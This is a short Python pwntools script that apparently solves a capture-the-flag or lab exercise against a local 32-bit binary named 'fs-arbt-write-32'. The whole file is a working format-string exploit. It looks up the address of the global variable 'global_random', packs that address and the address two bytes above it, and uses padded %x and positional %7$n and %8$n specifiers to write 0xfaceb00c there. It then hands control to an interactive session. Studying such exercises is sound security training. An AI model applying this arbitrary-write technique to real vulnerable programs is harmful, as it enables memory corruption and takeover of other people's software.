#!/usr/bin/env python

from pwn import *
import os

p = process("./fs-arbt-write-32")

target_gv = p.elf.symbols['global_random']
print(hex(target_gv))
t2 = target_gv + 2
print(hex(t2))

print(p.recv())
first = 0xb00c - 8
second = 0xface - 0xb00c
while second < 0:
    second += 0x10000

print(first)
print(second)

buf = p32(target_gv) + p32(t2)
buf += "%" + "%05d" % first + "x"
buf += "%7$n"
buf += "%" + "%05d" % second + "x"
buf += "%8$n"
print(buf)
#buf = p32(target_gv) + p32(t2) + "%134514538x%n" + "%4x%n"
p.sendline(buf)
#print(p.recv())
p.interactive()
